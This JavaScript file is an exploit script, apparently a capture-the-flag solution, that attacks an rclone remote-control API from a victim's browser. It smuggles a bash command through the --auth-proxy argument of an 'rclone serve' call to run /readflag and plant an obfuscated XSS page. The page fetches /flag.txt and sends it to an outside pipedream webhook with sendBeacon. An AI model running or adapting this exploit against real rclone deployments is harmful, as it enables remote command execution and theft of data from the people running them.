const leDomain = "rclone"
const rcAPIEndpoint = `http://${leDomain}:5572`;
const fakeRcAPIEndpoint = `http://a:b@${leDomain}:8080`;
const webhook = "https://exfil-addr.x.pipedream.net";
const exfilRcAPIEndpoint = `http://${leDomain}:8079`;
const ownedUrl = "https://secure.mydomain.tld";
for (let i = 0; i < 1; i++) {
    // just a threaded python server that has a route that just sleeps for 5 seconds.
    fetch(`${ownedUrl}/delay`, {
        cache: "no-store",
        mode: "no-cors",
    })
}

(async () => {
    console.log("started")
    const sleep = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
    let res;

    let innerScript = `
const webhook = "${webhook}";
navigator.sendBeacon(webhook, "xss script init");
console.log("xss script init");
(async () => {
    console.log(window.location);
    let res = await fetch("/flag.txt");
    res = await res.text();
    navigator.sendBeacon(webhook, res);
    console.log("gg!")
})();
    `.trim();
    innerScript = innerScript.split('').map(c => c.charCodeAt(0)).join(',');

    if (window.location.protocol == "https:") {
        let uServe = new URL(`${rcAPIEndpoint}/core/command`)
        uServe.searchParams.set("command", "serve")
        uServe.searchParams.set("arg", JSON.stringify(["http", "--auth-proxy", `/bin/bash -c CMD=$'\\x20<script>eval(String.fromCharCode(${innerScript}))</script>';/readflag>/tmp/flag.txt;echo$CMD>/tmp/xss.html`, "--addr", "0.0.0.0:8080", "--verbose", "--log-file", "/tmp/log", "--allow-origin", "*"]))
        uServe.searchParams.set("fs", "/")
        uServe.searchParams.set("_async", "true")
        try {
            res = fetch(uServe.href, {
                method: "POST",
                credentials: "include",
                mode: "no-cors"
            });
        } catch (e) { }
        let uRCD = new URL(`${rcAPIEndpoint}/core/command`)
        uRCD.searchParams.set("command", "rcd")
        uRCD.searchParams.set("arg", JSON.stringify(["/tmp", "--rc-addr", "0.0.0.0:8079", "--rc-allow-origin", "*", "--verbose", "--log-file", "/tmp/log-exfil"]))
        uRCD.searchParams.set("fs", "/")
        uRCD.searchParams.set("_async", "true")
        try {
            res = fetch(uRCD.href, {
                method: "POST",
                credentials: "include",
                mode: "no-cors"
            })
        } catch (e) { }
        window.open(`${fakeRcAPIEndpoint}/`, "_blank");
        await sleep(1000);
        console.log("all opened")
        window.location = `http://${leDomain}:8079/xss.html`
    } else if (window.location.protocol == "http:") {
    }
})();